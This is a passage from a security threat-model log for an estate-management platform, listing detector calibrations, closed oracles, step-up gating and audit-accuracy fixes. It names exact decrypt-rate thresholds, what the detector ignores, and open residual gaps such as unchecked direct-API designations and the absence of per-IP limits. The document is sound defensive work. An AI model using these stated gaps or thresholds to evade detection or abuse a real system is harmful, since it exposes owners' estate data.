runs with a live detector and no anomaly assertion over it. Nothing in that
journey reaches a decrypt class the dev journey does not, which is why this
is recorded rather than duplicated; a production-only decrypt path arriving
later owes the gate a second home.

### 6q(ii). AMENDMENT — the distinct-subject condition (2026-08-14)

**The alarm fired on an owner reading their own estate.** MEASURED against
the running stack: seven ordinary `/assets` page loads of a 120-asset estate
produced 1680 `asset` decrypts in about twenty seconds and raised
`crypto.decrypt_rate.exceeded` (`boundName=asset_user count=1680 bound=1500`).
Nothing was wrong with the reader, the reading, or the count — the count was
right. `asset` is the ONE bound in the table whose legitimate volume scales
with ESTATE SIZE rather than with activity: one `/assets` page load issues
Assets and NetWorth together, so it costs 2 decrypts PER ASSET OWNED, and the
1500 was itself calibrated on the M19 PR2 journey, an estate of a handful of
assets. Estate size is unbounded, so no constant survives it: raise the number
and you false-positive on some larger estate while blinding the detector for
every smaller one. A per-principal count cannot express this, which is why the
fix is a second dimension rather than a bigger number.

**What shipped.** `DecryptRateBound` gained an optional
`maxDistinctSubjectsPerWindow`, and a breach now requires BOTH thresholds to be
strictly exceeded. The subject is the row id already inside the field name,
located by a position declared per prefix in `DECRYPT_FIELD_SUBJECTS`
(@estate/contracts) and counted by the sweep's own
`count(DISTINCT CASE … split_part …)`. Exactly one bound carries the condition
(`asset`/`user`); every other prefix declares no subject, reports 0 distinct,
and decides on the count exactly as before.

**THE DETECTION THRESHOLD IS UNCHANGED — only the amplification is removed.**
The AND is safe because a principal touching N distinct subjects has made at
least N decrypts, so distinct ≤ count always; with the distinct threshold at or
below the count threshold (a table invariant, asserted), anything that clears
the count bound on DISTINCT rows clears the distinct bound too. A mass read of
N different assets still breaches at exactly the N it breached at before. What
the condition suppresses is precisely RE-READING, which moves no plaintext the
principal had not already seen.

**It can only ever suppress, which is why it is declared rather than inferred.**
A wrong subject position is a blind spot, not noise, so `doc` is the recorded
counter-example and is deliberately ABSENT: its field is
`doc.<ownerUserId>.v<n>.<sha>`, so the tempting segment 2 holds the OWNER — the
same value for every document a person holds — and declaring it would collapse
a whole library to one subject and suppress a mass document read. Sampling the
live stream shows a UUID there and invites exactly that mistake, so the
position is read from the code that BUILDS the string:
`packages/contracts/test/decrypt-field-subjects.spec.ts` pins every declared
position to its constructor in the owning service's source, and asserts both
halves of the `doc` case (undeclared, and segment 2 really is the owner).
Merging the sentinel's two actor types SUMS distinct counts, which over-counts
— deliberately, because an upper bound errs toward breaching, the only
direction a suppressing condition may fail in.

**Residuals, stated rather than implied.**
- **[ACCEPTED]** An estate with MORE than 1500 distinct assets still trips on a single page
  load. That is the detection threshold doing its job at the size where the two
  readings genuinely converge, and it is the honest cost of a constant: the
  detector runs in the audit cluster and cannot know how large an estate
  legitimately is without a cross-cluster read its fenced zero-credential
  posture forbids. Re-calibration is a reviewed commit, as for every other row.
- **[ACCEPTED]** A principal who has already read a set may now re-read it without limit. That
  was true of any count bound sitting above the set's size; what changed is
  that it is now true by construction rather than by luck.
- **[ACCEPTED]** The distinct count is only as good as the declaration. A prefix whose id tail
  is not per-row must never be declared, and the fence above is what keeps that
  from being a matter of memory.

**Evidence, one database, one table.** Three principals with the same estate
shape and the same browsing: the pre-fix run (1680 decrypts / 120 distinct)
raised an anomaly carrying `count: 1680` and no distinct fields; two post-fix
runs with byte-identical economics raised none. In the same window a
1501-asset estate read ONCE (3002 decrypts / 1501 distinct) breached, carrying
`distinctSubjects: 1501, distinctBound: 1500` — so the detector demonstrably
ran, and the silence on the browsing principals is a decision rather than a
dead tick.

## 6r. Threat-model delta — M19 the assets surface (2026-08-13)

M19 put the product's first owner-facing surface on the oldest domain
service in the repo. PR1's service hardening (the uniform 404 closing the
404-vs-403 oracle on every asset-scoped path, the list narrowed to one
decrypt per row) and the repo-wide route↔consumer fence are recorded in
docs/04; what belongs HERE is what the ceremony surface (PR3) changes about
the model and what it deliberately leaves open.

**The BFF membership check is best-effort hygiene at the edge, not a
security control, and a direct-API caller walks past it.** Designating a
beneficiary crosses two clusters — the designation lives in the financial
cluster, the contact in core — and docs/02 §8 forbids a cross-cluster FK,
so nothing in the database can make `asset_beneficiaries.contact_id` name a
real contact. The BFF refuses a designate whose contactId is not among the
caller's own contacts, because it is the only layer holding both clients on
the caller's own bearer. A caller speaking to the assets service directly
(any valid session; the service is CallerGuard + StepUpGuard) can still
mint a designation naming any UUID. What bounds it: the designation is in
the caller's OWN estate (Cedar scopes every asset route to the owner), it
directs nothing anywhere (no beneficiary visibility exists — below), the
dangling row renders honestly in the product ("No longer in your contacts")
and stays removable because remove is deliberately unchecked. Closing it
for real means either a projection of contact ids into the financial
cluster (a new consistency surface) or assets consulting profile
server-side (a new credential edge for a hygiene property) — neither is
worth its cost today, and this paragraph is the record of that decision.

**A designation is not access, and the surface says so out loud.** Naming a
beneficiary writes a ledger event and a projection row; it grants no read,
no notification, no visibility of any kind. docs/00 §5.5's "beneficiaries
see only assets naming them" remains UNBUILT — `namedBeneficiaries`
resolution requires the contact-link projection (M13's ceremony provides
the link; no milestone has yet joined it to designations), and until then a
beneficiary structurally cannot learn they were named. The ceremony's copy
carries both truths so an owner does not mistake a designation for an
arrangement anyone else can see. The share-sum constraint
(`share_sum_exceeded`, the repo's one CONSTRAINT TRIGGER) is enforced
per-class in the service and surfaced as its own refusal.

**The step-up retry loop spends decrypts during the propagation window,
and the spend is attributed to the owner themselves.** A step-up-refused
designate re-runs the full mutation while the peer's 30s session cache is
stale (the M13 prompt-and-retry contract), and each retry re-runs the BFF's
membership check — one contacts load, one audited decrypt per contact name
— before assets refuses downstream. MEASURED against the running stack for
one designation on a one-contact estate: five `contact.name` decrypts in
total — one for the picker, THREE membership checks (the refused attempt
plus two retry polls, the elevation propagating on the second), and one for
the name composition on reload. **THE SPEND SCALES WITH THE CONTACT BOOK, NOT
THE DESIGNATION COUNT** — the resolver loads every contact the owner has —
so the five above is a one-contact figure and the M19 PR4 review corrected
the conclusion drawn from it: the theoretical worst case is ~17 polls
across the 35s propagation budget times the whole address book, which for a
50-contact estate is order 850 `contact.name` decrypts and NOT "far under"
the M18 `contact/user` bound of 160/min. It remains self-inflicted (the
owner's own session, on their own trail, only while retrying a step-up they
initiated), which is why the bound firing there is a true positive worth
seeing rather than a false alarm to design around. Recorded rather than
re-engineered: every alternative either duplicates the freshness gate at
the edge (a second copy that drifts) or adds a client-controllable skip
flag to a check whose absence is already a recorded residual (above).

### What the PR4 review changed about the model

**A deletion-class verb had no second factor, and PR2 gave it a button.**
Retirement is the assets service's one IRREVERSIBLE command — every other
command appends a correction, and even a removed designation leaves its
history — so docs/01 §5's "deletion requests" covers it, as assets' own
beneficiary route has complied since M3. It shipped in M3 under `CallerGuard`
alone and nothing revisited it, which was dormant while no client existed and
live the moment M19 PR2 put Retire on screen: a stolen bearer could have
retired an estate's assets one at a time without ever proving a factor.
Closed with `StepUpGuard`, and the route's gate class is now DECLARED AS DATA
and checked against Nest's RUNTIME route metadata, so a future route arrives
with a gate decision or the build fails. **Residual, stated rather than
implied: that fence covers the assets service only.** The other eight services
have no equivalent, and their step-up coverage is still whatever their
controllers happen to say — generalising it is a change to eight services and
belongs to whichever milestone next touches them.

**A globally-unique idempotency index was a cross-user event-existence
oracle.** `asset_events.event_id` was UNIQUE across the whole table and the
lookup carried no owner predicate, so submitting an id belonging to somebody
else answered 409 where an unused id answered 201 — measured live. Because the
ids are CLIENT-generated by design (that is what makes a retry a no-op), an
observed id is a probe. Scoped to `(user_id, event_id)`, and the lookup now
carries the owner, so a foreign id is byte-identical to an unused one. The
owner's own replay still answers 409, which is the feature rather than a leak.

**The version read now fails CLOSED, and that has a price worth naming.** A
projection row and its latest ledger seq were read in separate pool queries —
separate snapshots — with the row first, so a command landing between them
paired OLD state with a NEW version and the caller's next `If-Match` passed
against state they had never seen. That is a silent lost update. Reversed, the
same race pairs new state with an old version and the write is refused with a
409 the surface already handles by re-reading. The cost is real and accepted:
a reader unlucky in that window is told to reload when nothing was wrong with
what they had. Failing closed on a write is the correct side of that trade,
and it is the only side that cannot silently discard someone's edit.

**A rate bound read as an outage.** Identity's step-up cap answers 429
`too_many_attempts`; the BFF had no mapping, so a control firing exactly as
designed surfaced as "something went wrong on our side" (§6k's bound, §6j's
lesson, arriving on the assets surface because M19 put two step-up ceremonies
there). It has its own code and its own copy now — the only refusal in the
union whose remedy is to WAIT rather than to act differently, which is
precisely why it must not borrow the credential code's "enter the current
code" wording. The copy deliberately does not state the window in minutes:
that number is a reviewed constant in a service the web app cannot import, and
a figure people plan around must not be a second copy free to drift.

### Residuals

- **[OWNER: M45]** *The route-gate fence covers the assets service only.* The
  other eight services have no equivalent, so their step-up coverage is still
  whatever their controllers happen to say. Generalising it is a change to
  eight services. **RE-OWNED FROM M21 BY M40 PR2** (§6fff): the bullet argued for
  M21 on PROXIMITY — "the operator platform is the next milestone that touches a
  service's guard surface across the repo" — and proximity is not subject. What is
  wrong here is a FENCE whose corpus is narrower than its claim, which is M45. The
  fence's own §6r paragraph left the assignment to "whichever milestone next
  touches them", which is how an item goes uncosted.
- **[OWNER: M28]** *docs/00 §5.5's "beneficiaries see only assets naming them"
  remains UNBUILT.* `namedBeneficiaries` is a default parameter every
  `assetResource` call site takes by omission, so `beneficiary.cedar` is loaded
  and structurally unmatchable. M13's ceremony supplies the contact link; no
  milestone has yet joined it to designations. Same residual as §6s's, reached
  from the other end.
- **[ACCEPTED]** *An unlucky reader is told to reload when nothing was wrong.*
  The version read fails closed, which costs a spurious 409 in one race window
  and is the only side of that trade which cannot silently discard an edit.
- **[ACCEPTED]** *The step-up retry loop's decrypt spend scales with the
  contact book.* Self-inflicted, on the owner's own session and their own
  trail, only while retrying a step-up they initiated — so the M18 bound
  firing there is a true positive worth seeing rather than a false alarm to
  design around.


## 6s. Threat-model delta — permission grants confer only what something reads (2026-08-14)

Found while scoping the next milestone, fixed on its own before it: **the
platform accepted permission grants it did not honour, and told the owner it
had.** `permission_grants` took any lowercase token as a `resource` and any of
three actions; `RolesService.addPermission` wrote the row, `events.service`
audited `permission.granted`, and the people surface listed it back under "What
this role may read". Exactly one pair is read by anything —
`RolesRepo.effectiveContactReadGrants`, profile's only grant reader and the
enforcement behind §5.5's contact boundary, filters `pg.resource = 'contact' AND
pg.action = 'read'`. MEASURED against real Postgres over the six combinations the
surface offered: one conferred access, five conferred nothing, and two of those
five were buttons an owner could press ("Allow: Your assets", "Allow: Your
documents").

**This is worse than a refusal, which is why it is here rather than in a
changelog.** A refused grant is visible and can be worked around. An accepted one
that confers nothing produces a durable false belief about who can see an estate
— an owner who "shared their assets with their executor" has a written record
saying so, and the only way to discover otherwise is to notice that nothing
happened. Nobody gains access they should not have; the exposure is that the
owner's mental model of their own estate is wrong in the permissive direction,
which is the direction that stops them arranging real access.

**What changed.** `enforced-grants.ts` declares the (resource, action) pairs
something honours, with a reason per entry; `addPermission` refuses everything
else with `422 grant_not_enforced` — its own token, kept apart from the generic
parse 400 through the BFF and into the app's copy, because "we have not built
this" and "your request was malformed" send a person to different places (the M9
rule applied to a refusal). The refusal sits AFTER the ownership check, so it can
never answer a question about somebody else's estate (the M10 rule). The people
surface stops offering what nothing enforces and SAYS which parts of an estate
are not shareable, because silence would leave the same wrong belief more
quietly; the link-redemption panel's "anything they choose to share with you" is
narrowed for the same reason. Two fences hold it: profile's asserts the declared
table equals what the reader's SQL really filters on and that no undeclared file
reads grants, and the web's asserts what the surface offers equals what profile
declares — neither side could see this drift alone, since both lists were
internally consistent and both suites were green for three milestones.

**OPEN, and stated rather than implied: role-based sharing covers estate
contacts and nothing else.** There is no mechanism by which an owner can let a
trustee, executor or beneficiary read an asset or a document — not a broken one,
none. §5.5's "unless the owner explicitly opens visibility" and risk #1's
"trusted-contact review mode" describe intent, not shipped controls, and §6r
already records that no beneficiary visibility exists. Building it is a
cross-cluster authorization change (assets and documents are separate services on
separate clusters and hold no profile credential), so it belongs to a milestone
that can take that decision; a new enforced pair arrives in the same change as
the code that reads it, which is what the fence forces.

**Two residuals.**

- **[ACCEPTED]** *Rows written before the vocabulary closed are inert and remain
  in the table.* They render with their label and stay withdrawable rather than
  being hidden or degraded to a bare token, because an owner must be able to
  see and remove a permission that exists.
- **[ACCEPTED]** *The DDL keeps its open `TEXT` column deliberately.*
  `permission_grants` is docs/02 §2 verbatim, migrations are append-only, and
  narrowing it would need a pre-flight over exactly those inert rows; the API
  is the enforcement point and the reader ignores everything else.

## 6t. Threat-model delta — a mail the carrier refused was recorded as delivered (2026-08-14)

**Three identity call sites read a discriminated union's DISCRIMINANT as if it
were its ANSWER.** `SendOutcome` is
`{ accepted: true; delivered: boolean; … } | { accepted: false }`. `accepted`
says a healthy notifications service replied; `delivered` says the mail went,
and the type's own docstring states the rule — *"Callers record either as a
non-delivery."* The notifications service answers `accepted: true,
delivered: false` for `no_recipient` and `carrier_failure` (a crypto-shredded
DEK lands in the latter). These three read the discriminant alone:

- `password-reset.service.ts` — the mailed reset code (`auth.password.reset_requested`)
- `password-reset.service.ts` — the completion notice (`auth.password.reset_completed`)
- `auth.service.ts` — the password-change notice (`auth.password.changed`)

Each of those booleans renders as the literal string `delivered` or `failed` in
an **append-only** audit event, so a notice that never reached anyone was
recorded as delivered. That is the M14 PR0 shape — an audit claim inverted —
and it sat on the account-recovery ceremony, whose entire failure mode is a
user who cannot get in.

**Reachable, not theoretical.** M9's recipient feed is fire-and-forget at
registration and login, so a registration during a notifications outage leaves
no recipient row — and that user is exactly the one who later cannot sign in and
asks for a reset. They receive nothing, and the trail says they were told.

**TypeScript could not catch it, and that is the general lesson.** The union
forces a narrowing on `accepted` before `delivered` may be read, so *stopping at
the narrowing guard type-checks perfectly* while meaning something else. A
discriminant is not an answer.

**Nor could any test, because no double ever answered on the disagreeing arm.**
Every spec in identity's test directory hand-rolled its own notifications double,
and of the twelve that produce an outcome, not one ever returned
`accepted: true, delivered: false`. Measured, because the first draft of this
section claimed something stronger and false ("every one answered a bare
`{ accepted: true }`"): of 38 specs, 13 name `accepted` and 12 produce an
outcome; **four** answered a bare `{ accepted: true }`, which is not a valid
`SendOutcome` at all — the accepted arm carries `delivered`, `channel` and
`recipientVerified` too — but **three produced fully valid four-field outcomes
and were exactly as blind**. So the mechanism was never a malformed shape; it
was an UNEXERCISED ARM, and every producer was `delivered: true`.

The compiler could not close it either: the doubles reach their constructors
through `as never` or `as unknown as NotificationsPort`, and a cast on the outer
object leaves the inner method's return type inferred and never compared to the
port. The M16 PR2b lesson, one layer beneath the fixtures. The one case that
looked like coverage — `auth.service.spec.ts`'s "NOTIFIES the owner, and puts
the outcome on the audit event" — only ever used `{ accepted: false }`, the arm
where the discriminant and the answer AGREE.

**§6l's residual was a promise the code did not keep.** It states that an
undelivered notice "leaves `notified: failed` on the audit event … for an
operator to re-drive". For the password change that was false: a carrier refusal
left `notified: delivered`, so the one record an operator would use to re-drive
said there was nothing to re-drive. The sentence is now true rather than
rewritten.

**The fix is one spelling and a fence, not three edits.** `wasDelivered` in
`@estate/notifications-client` is the single derivation for every CONSUMER of a
send outcome, used at all seven identity sites (the four that were already
correct included — one behaviour, one place).
`packages/notifications-client/test/delivery-outcome.spec.ts` then forbids a
consumer from NAMING the discriminant at all unless it is one of three declared
notifications adapters — vault, settlement and profile — which must name it for
a genuinely different reason: they translate the wire outcome into their own
service-level port, and TypeScript will not let them read `delivered` or
`recipientVerified` off the union without narrowing on `accepted` first. (They
are not the 503: `notifications_unavailable` comes from `deliversToRealChannels`,
a property of the adapter CLASS, checked by the service elsewhere. An earlier
draft of this paragraph credited `!accepted` with that refusal and was wrong.)
Each adapter collapses the refused arm to `delivered: false`, which is
`wasDelivered` by hand — so the fence additionally holds them to using
`accepted` ONLY as a negated gate (`if (!x.accepted)`), and an adapter that
started deriving a delivery fact any other way turns it red. The same fence
forbids hand-rolled `accepted:` literals in identity's test directory, where
four named constants typed as `SendOutcome` now carry the outcomes.

**Residuals, stated.**

- **[ACCEPTED]** *The scan is on the identifier, so a destructure is caught and
  `Object.values(outcome)[0]` is not.* Closing that wants the TypeScript AST,
  which is more than a fence should carry. The constants' `SendOutcome`
  annotation is the real shape check — it is the one place no cast intervenes —
  and it is a convention the fence enforces rather than something the compiler
  can.
- **[ACCEPTED]** *Two of the three wire translations have no test of their own.*
  See the paragraph below: the fence bounds them (they may only narrow) and
  does not close them.

The three adapters are left as they are, but the reason is narrower than an
earlier draft claimed. Only VAULT doubles the client port faithfully
(`notifier-adapters.spec.ts`, typed `NotificationsPort` / `Promise<SendOutcome>`);
settlement's `HttpNotifier` and profile's `HttpLinkNotifier` are never
constructed in a test at all — their suites double the SERVICE-level port above
them, so the wire translation itself is uncovered. What makes that safe rather
than lucky is that all three read `outcome.delivered` explicitly on the accepted
arm, so an incomplete literal fails SAFE; the residual is that two of the three
translations have no test of their own, which the fence bounds (they may only
narrow) but does not close.

**Proven live, on the disagreeing arm.** Two probe accounts against the running
stack with identity rebuilt from this branch; one keeps its recipient row, the
other's is deleted, which is exactly what M9's fire-and-forget feed leaves behind
when it misses. Both reset requests answer an identical `202`, so the
enumeration property is untouched. The control records
`password.reset_requested | delivered` in `auth_events` and
`{"delivered": "delivered"}` in the audit chain, and keeps one live code. The
recipient-less account records `failed` in both and keeps **no** live code — the
one nobody holds was retired. `notification_sends` holds the other half of the
proof: its `identity.password_reset` row exists with outcome `no_recipient`, and
that row is written by the notifications service itself, so its existence proves
the service ANSWERED (`accepted: true`) while `no_recipient` maps to
`delivered: false` — the precise arm on which the old read and the new one
disagree. Reverting either read turns its own integration case red against real
Postgres.

**One claim in the code was ALSO wrong and is corrected.** The comment beside the
reset's retire-on-failure said retiring prevents "a TTL-long lockout". It does
not: `lastMintedAt` orders over ALL rows including revoked ones, so retiring
cannot shorten the re-issue floor, and the unconditional retire before each mint
already stops a stale code blocking the next one. The code is retired because a
live reset code that reached no mailbox should not exist — which matters most in
the `carrier_failure` case, where the carrier may have taken the message before
failing.

## 6u. Threat-model delta — M20 PR1, the account password surface (2026-08-15)

**§6l shipped the control and nothing could reach it.** `POST /v1/auth/password`
has existed since M17 PR2 with no consumer anywhere — the route↔consumer fence
(M19 PR1) recorded it, with five siblings, under `EXEMPT_RECOVERY_SURFACE`
naming this pending slice. A password rotation nobody can perform is not a
mitigation for anything: §5 risk #1 (account takeover) lists credential rotation
among its responses, and until this PR the platform's answer to "your password
may be compromised" was that there was no answer. The exemption is flipped to a
real consumer in the same change as the client, on the M9 PR2 holders-flip rule.

**The edge adds no authority and no second gate.** The BFF forwards the caller's
own bearer and holds no credential (the M8 PR5 pattern, unchanged), so the
strongest thing a compromised BFF can do here is replay a session it is already
serving. It also deliberately does NOT re-validate the new password: identity's
schema is the gate, and a second copy at the edge is a copy free to drift from
the one that decides (the M12 upload-client rule). The BFF's own spec asserts a
four-character password reaches identity and is refused THERE.

**The refusals stay four, because their remedies are four.** `INVALID_CREDENTIALS`
(re-check the password), `STEPUP_REQUIRED` (find your authenticator),
`TOO_MANY_ATTEMPTS` (wait — M17 PR6's bound, whose 429 branch M19 PR4 taught the
edge to read) and `INVALID_REQUEST` (choose a longer password). Collapsing any
pair sends someone to do the wrong thing, and folding the bound into the
credential refusal would render "check your password" at somebody whose next
correct password will also be refused — the M9 rule that a control firing must
not read as an outage.

**`INVALID_CREDENTIALS` NOW MEANS A THIRD THING, AND THE COPY IS CHOSEN PER
SURFACE.** Identity answers one token for a rejected password, a rejected TOTP
code and now a rejected *current* password. M12 found the first collision (a
step-up prompt telling users their email and password combination was wrong on a
form with neither field) and fixed it with `stepUpMessageFor`; this is the same
finding a third time, closed the same way with `passwordChangeMessageFor`, whose
sentence also states that nothing changed — the fact a person most needs after a
refusal on a route that rewrites their credential.

**ONE STEP-UP PROMPT PER PAGE, still.** `/security` can be refused for every
reason `StepUpTarget` names — six, after PR2 added the address change, and this
sentence deliberately no longer carries a number that a later PR has to
remember to update (the PR5 review found three counts in three files, of which
only the union was right). The M15 PR3 defect is two identical "Confirm it's
you" fields no person or query can tell apart. `StepUpTarget` admits one at a time and every
other opener is disabled while one is up; the prompt renders as a SIBLING of the
form, never nested inside it (the M16 PR3a rule — a form inside a form is a tree
the DOM API accepts and no parser would build).

**WHICH HALF OF THE RETRY IS LOAD-BEARING WAS ESTABLISHED BY MUTATION, and my
first answer was wrong.** The retry carries the submitted attempt rather than
re-reading the inputs, which is the M13 review's fix for a step-up retry running
the action from the form's *current* state. Reverting that carry left every test
green: the real control is that the prompt REPLACES the form, so while a change
is pending there are no inputs to edit. The carry is kept as belt for a stated
reason — the moment somebody makes the form merely disabled rather than unmounted
(a plausible, otherwise harmless edit) the values become live again — and the
replacement itself is now pinned by its own assertion. Recorded because the
tempting move was to weaken the mutation until it went red and call the fix
proven.

**The confirm field is a typo guard and is never sent.** It exists because this
form replaces a credential the user cannot afterwards read back, and a mistyped
new password is a lockout the platform's own recovery path (§6m) then has to
undo. It is compared in the browser and dropped there; identity is asked about
one password, not two.

**The minimum was declared four times with nothing comparing them.** Identity's
schema, the browser's pre-flight, its hint text and its error copy each carried
`12`, so a change to the gate would have left three surfaces telling users
something false — the drift class this repo keeps closing. `password-policy.test.ts`
reads identity's controller as text and asserts every password minimum it
declares is either the constant this app shows or a bare presence check;
mutating identity to `min(14)` turns it red.

**The fence gained a check for the opposite failure.** `route-consumers.spec.ts`
asserted that every route is consumed or exempt, and would have stayed green
forever with this route exempt after a consumer landed — an exemption is a claim
about the world that rots. It now also asserts no exemption is STALE: an exempt
route that some consumer really addresses fails with instructions to flip it.
Verified with the exact regression.

**THE PAGE WAS TELLING EVERY ACCOUNT IT HAD A SECOND FACTOR.** Driving this
surface found a defect older than the PR and directly on it: GraphQL serialises
an enum as its member NAME, so the wire carries `"NONE"`, while the web app had
declared `MfaLevel` as `'none' | 'mfa' | 'stepup'` since M2. Every
`session.mfaLevel === 'none'` in the app was therefore permanently false.
Measured on the running stack against an account with no `mfa_methods` row and
`sessions.mfa_level = 'none'`: the security page showed **"MFA enrolled"** and
offered **"Re-enroll authenticator app"**, and the home page's session card said
the same. After the fix, same account and same session: "MFA not enrolled" and
"Set up authenticator app".

The consequence is a misstatement about a control, in the direction that stops
someone acting. A user reading "MFA enrolled" has no reason to enrol, so the
account most in need of a second factor is the one told it already has one —
and on this page that claim now sits directly above a password change whose
step-up gate is conditional on exactly that factor, so a factorless user sees
their password change complete with no challenge while the page insists a factor
protects it. It is not an authorization defect: `SecondFactorGate` reads the
database, never the browser, so nothing was permitted that should not have been.

**Neither existing gate could see it, for reasons worth keeping.** `tsc` compares
values against the DECLARATION, and the declaration was the thing that was wrong,
so a comparison that can never be true type-checks perfectly. Every fixture said
`mfaLevel: 'mfa'` — the same invented vocabulary — which is the M15 rule that a
fixture inventing an enum tests the fixture; the two tests that touched the
authenticator button were green under the defect because they used the enrolled
branch, and the `NONE` branch that a brand-new account hits had never been
rendered by any test. `graphql/enum-parity.test.ts` now derives all five enum
mirrors from the BFF's SDL and asserts them member for member, and the
factorless branch is pinned on both surfaces (`SessionCard` gained its first
test at all).

**NOT closed by this PR, and stated so it is not assumed.** There is still no
breach-corpus check on a chosen password (§4 TB1 lists it as a control), no
per-IP bound (§6k — identity has no client IP and neither public edge forwards
one), and no notification-suppression concern to add: identity already mails
`identity.password_changed` on its own security edge (§6l), which this surface
does not touch. The remaining recovery routes — reset request/complete and the
three address-change legs — stay exempt with their pending slices named, and PR2
and PR3 flip them. Separately measured while driving this: the web app never
refreshes an access token, so a signed-in browser reports "Your session has
ended" after 15 minutes while its session row is live for 30 days — the gap M20
PR4 is scoped to close, now observed rather than inferred.

### Residuals

- **[OWNER: M29]** *No breach-corpus check on a chosen password.* §4 TB1 lists
  it as a control and nothing implements it; it needs a corpus source and a
  privacy-preserving lookup, which is a change to the sign-in surface rather
  than to this page.
- **[OWNER: E1]** *No per-IP bound.* Identity has no client IP and neither
  public edge forwards one, so this is the same edge work §6k defers to the
  WAF — blocked on the AWS half, not on an engineering decision.
- **[CLOSED: §6x]** *The web app never refreshed an access token*, so a
  signed-in browser reported "Your session has ended" after 15 minutes while
  its session row was live for 30 days. Measured while driving this surface;
  M20 PR4 closed it.


## 6v. Threat-model delta — M20 PR2, the address-change surface (2026-08-15)

**§6n's own residual, closed by the PR that line predicted.** M17 PR4 shipped
all three legs of the address change with their copy decisions taken and no
surface at all, and recorded it as the same zero-callers gap as its siblings',
naming the M14 PR3 settings page as where the ceremony belonged. This is that
page. The route↔consumer fence's `EXEMPT_RECOVERY_SURFACE` now holds only the
two reset legs, which need a signed-out route group of their own (PR3).
**CLOSED by M20 PR3 (§6w)**: both reset legs are consumed and the constant
itself is deleted.

**The 202 is not a delivery receipt, and no layer is allowed to render it as
one.** Identity answers the request BEFORE it knows whether it will send
anything: the availability lookup, the encrypt, the stage and the mail all run
detached, precisely so an address that already belongs to somebody else is
answered identically to a free one and simply never mailed. That uniformity is
the control, and it constrains this surface all the way up:

- The BFF client returns `void`. There is no field a caller could mistake for
  confirmation, so the honest copy is forced rather than chosen.
- The success sentence is CONDITIONAL — "if *address* isn't already in use here,
  a code is on its way to it" — and its own test asserts the absence of a
  we-have-sent claim. Rendering the 202 as a send would tell one caller, in the
  one case that matters, exactly what the silent-availability control withholds.
- The re-issue refusal is named for the REQUEST, not for a send
  (`CODE_REQUESTED_RECENTLY`). Identity's `too_soon` covers the per-account floor
  AND the per-destination bound, and the destination bound fires on volume aimed
  at an address that may have been staged nothing and mailed nothing — so a code
  called `CODE_ALREADY_SENT`, with copy telling the reader to use the one they
  were sent, would send them looking for a mail that will never arrive.

**Two route-specific error mappers, because the shared one is wrong here.**
`mapError` keys 400 on the STATUS and answers `INVALID_REQUEST`; identity answers
**400** for a rejected account password, for both re-issue bounds, and for every
refused code. Without the mappers a wrong password and a rate refusal would both
reach the browser as "review your request", and the completion leg's single
uniform refusal would flatten into the same. The completion mapper also may not
fall through to the shared 401 branch, which maps `invalid_code` to
`INVALID_CREDENTIALS` — the login vocabulary, on a form whose only field is a
mailed code. That is the M12 collision, avoided rather than rediscovered.

**The uniform refusal is carried through, never re-derived.** Identity answers
one `invalid_code` for a code that is unknown, expired, spent, cancelled,
attempt-exhausted, mis-shaped, key-rotated, or whose candidate address was
registered by somebody else during the window. That last one is why the
uniformity matters beyond denying a progress meter: `address_taken` would leak
another account's existence to an authenticated stranger. The edge maps all of
them to one code, and the surface's copy carries the possibilities the server
deliberately will not distinguish — WITHOUT offering the shared sentence's
"send yourself a new one", because there is no resend route for a pending
change and offering a button that does not exist is how a stuck user stays
stuck.

**The completion form is always available, and that follows from a gap rather
than a preference.** Identity exposes no read of a pending change, so the page
cannot know on load whether one is outstanding. A code field that appeared only
after a request made in THIS tab would strand anyone who closed the page or who
reads their mail on a different device — so the field, the confirm button and
the ungated cancel are rendered unconditionally.

**Asymmetry, and the M15 label rule.** Asking is step-up gated (conditionally,
via `SecondFactorGate` — an account with no verified factor is let through, the
bootstrap case); finishing and cancelling are not. Somebody who has just
realised they typed the wrong address must not be sent to find an authenticator
first. The section reuses the page's ONE `StepUpTarget` prompt rather than
raising its own. Its password field is labelled "Account password" and not
"Current password" — caught by the existing password-change tests refusing to
run, because two fields on one page carrying the identical label are two inputs
neither a person tabbing through nor a query can tell apart; the two mailed-code
fields on the page (`EV1-` verification, `EC1-` change) are kept distinct for
the same reason, pinned by a whole-page label-uniqueness assertion.

**One page, two panels, one fact.** Completing a change moves the address AND
vouches for it in the same statement (redeeming the code proved the mailbox
seconds earlier), so the sibling `EmailVerificationPanel` would otherwise go on
saying "your email address hasn't been confirmed yet" directly above the sentence
saying it has — one page contradicting itself about a control, the shape M19 PR2
found in the trust card and M20 PR1 found in the session card. A page-level
client wrapper re-mounts that panel on completion, so the authority stays the
SERVER rather than a boolean passed between siblings.

### Residuals

- **[CLOSED: §6qq]** ~~*The app-shell `UnverifiedAddressBanner` goes stale until the next
  navigation.*~~ **CLOSED by M24 PR1 (§6qq)**, which built the shared client
  read cache this line said the app does not have. The banner subscribes
  through it; the transport announces every successful mutation; and both
  vouching ceremonies — `VerifyEmail`, and `CompleteEmailChange`, which
  vouches in the same statement that switches — invalidate the read, so the
  banner re-ASKS the server without waiting for a navigation. Its
  per-navigation freshness is otherwise unchanged, and the authority stays the
  server: an invalidation discards an answer and asks again, never patches
  one.
- **[CLOSED: §6rr]** ~~*No surface shows the address currently on file.*~~ **CLOSED by
  M24 PR2 (§6rr)**, which gave `users.email_ct` its first reader ever, end to
  end: an account-audience-only identity GET that records `auth.email.viewed`
  BEFORE the decrypt, a dedicated BFF query, and a reveal-on-demand control on
  /security that never asks on mount. An owner wondering whether a refused
  change was "the one you already sign in with" can now look. Identity's
  conflated `invalid_request` itself is unchanged — the copy still names the
  possibility without asserting which applied — but the fact needed to resolve
  it is one click away, disclosed on the owner's own audit trail.
- **[ACCEPTED]** *§6n's own remaining residuals are untouched* — recorded there,
  not here. An honest user typing a taken address still waits for a mail that
  never comes; `identity.email_changed`'s reader still has no self-service
  response. **REDUCED TO A CROSS-REFERENCE BY M40 PR2** (§6fff): the second half
  RESTATED §6n's own bullet, so one item stood in two sections under one owner and
  a reader finding either believed it complete — the shape M40 PR1 closed for the
  404-vs-403 oracle, ONE PR later inside the same milestone, in the set that sweep
  did not cover. §6n holds the item and its owner (M46); this bullet is
  `[ACCEPTED]` because a pointer owes no work.

## 6w. Threat-model delta — M20 PR3, the password-reset surface (2026-08-15)

**The last two exempt recovery routes have a consumer, and the exemption is
GONE, not emptied.** M17 PR3 shipped the reset with every copy decision taken
and no surface at all; §6m recorded that as the zero-callers gap it was. Both
legs now have a product consumer (two unauthenticated BFF mutations and a
`/reset` page on the `(auth)` route group — the first ceremony in the product a
